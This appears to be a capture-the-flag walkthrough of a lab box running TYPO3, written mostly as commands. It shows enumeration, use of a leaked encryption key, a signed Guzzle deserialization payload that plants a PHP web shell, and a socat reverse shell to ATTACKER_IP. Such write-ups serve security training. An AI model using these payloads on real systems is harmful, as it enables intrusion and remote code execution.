https://superhero1.github.io/THM/walkthroughs/enterprize.html

nano /etc/host
10.10.162.26 enterprize.thm

	2.0. Port scan
sudo nmap -sCV -T5 --min-rate 2500 -p- enterprize.thm -oN nmap.txt

	2.1. Server website
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://enterprize.thm/FUZZ -o info/log_fuff1.txt

	
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://enterprize.thm/FUZZ -e .json,.php,.html,.bak,.old,.sql -fc 403 -o info/log_fuff_files.txt

curl http://enterprize.thm/composer.json

	2.2. Subdomain
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.enterprize.thm" -u http://10.10.162.26/ -fs 85 -o info/log_fuff_subdomains.txt

maintest                [Status: 200, Size: 24555, Words: 1438, Lines: 49]

nano /etc/host
10.10.162.26 maintest.enterprize.thm

	2.3. Typo3
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://maintest.enterprize.thm/FUZZ -fc 403 -o info/log_fuff_maintest.txt

fileadmin               [Status: 301, Size: 249, Words: 14, Lines: 8]
typo3                   [Status: 301, Size: 245, Words: 14, Lines: 8]
typo3temp               [Status: 301, Size: 249, Words: 14, Lines: 8]
typo3conf               [Status: 301, Size: 249, Words: 14, Lines: 8]


	2.4.1 LocalConfiguration information leak
typo3conf

	2.4.2 LocalConfiguration information leak
wget https://raw.githubusercontent.com/JavierOlmedo/UltimateCMSWordlists/master/typo3/core/version%209.x/typo3-9.5.4_16477.txt

cat typo3-9.5.4_16477.txt | cut -d"." -f1 | cut -c2- > typo3_custom.txt

ffuf -w typo3_custom.txt -u http://maintest.enterprize.thm/FUZZ -e .old -fc 301 | grep "\.old"


	typo3conf/LocalConfiguration.old [Status: 200, Size: 5434, Words: 1606, Lines: 131]


curl http://maintest.enterprize.thm/typo3conf/LocalConfiguration.old

...
'encryptionKey' => '712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b',
...

	3. Foothold
	3.1. Research
...
"guzzlehttp/guzzle": "~6.3.3",
...

	3.2. Putting it together
https://github.com/ambionics/phpggc/

Firstly, we create a file to be stored on the server, e.g. inject.php:

<?php $output = system($_GET[1]); echo $output ; ?>

Secondly, we run it through phpggc with the standard fileadmin temp folder as file destination:

./phpggc -b --fast-destruct Guzzle/FW1 /var/www/html/public/fileadmin/_temp_/inject.php ./inject.php

which returns the following payload:

YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NDg6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8vaW5qZWN0LnBocCI7czo1MjoiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAc3RvcmVTZXNzaW9uQ29va2llcyI7YjoxO3M6MzY6IgBHdXp6bGVIdHRwXENvb2tpZVxDb29raWVKYXIAY29va2llcyI7YToxOntpOjA7TzoyNzoiR3V6emxlSHR0cFxDb29raWVcU2V0Q29va2llIjoxOntzOjMzOiIAR3V6emxlSHR0cFxDb29raWVcU2V0Q29va2llAGRhdGEiO2E6Mzp7czo3OiJFeHBpcmVzIjtpOjE7czo3OiJEaXNjYXJkIjtiOjA7czo1OiJWYWx1ZSI7czo1MjoiPD9waHAgJG91dHB1dCA9IHN5c3RlbSgkX0dFVFsxXSk7IGVjaG8gJG91dHB1dCA7ID8+CiI7fX19czozOToiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBzdHJpY3RNb2RlIjtOO31pOjc7aTo3O30=

We create a simple php file, e.g. hmac_sign.php:

<?php
  $key = "712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b";
  $message = "YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NDg6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8vaW5qZWN0LnBocCI7czo1MjoiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAc3RvcmVTZXNzaW9uQ29va2llcyI7YjoxO3M6MzY6IgBHdXp6bGVIdHRwXENvb2tpZVxDb29raWVKYXIAY29va2llcyI7YToxOntpOjA7TzoyNzoiR3V6emxlSHR0cFxDb29raWVcU2V0Q29va2llIjoxOntzOjMzOiIAR3V6emxlSHR0cFxDb29raWVcU2V0Q29va2llAGRhdGEiO2E6Mzp7czo3OiJFeHBpcmVzIjtpOjE7czo3OiJEaXNjYXJkIjtiOjA7czo1OiJWYWx1ZSI7czo1MjoiPD9waHAgJG91dHB1dCA9IHN5c3RlbSgkX0dFVFsxXSk7IGVjaG8gJG91dHB1dCA7ID8+CiI7fX19czozOToiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBzdHJpY3RNb2RlIjtOO31pOjc7aTo3O30=";
  $output = hash_hmac('sha1', $message, $key);
  echo $output;
?>

to sign our payload running:

php hmac_sign.php

2b01628d8043b631fba121226d2291c29163fd6f

	3.3. Reverse shell
On the attackerâ€™s machine:

wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat

python3 -m http.server

nc -lnvp 4444 (separate terminal)

On the target host:

wget -q http://10.10.162.26:8000/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444

export TERM=xterm-256color

export SHELL=bash



























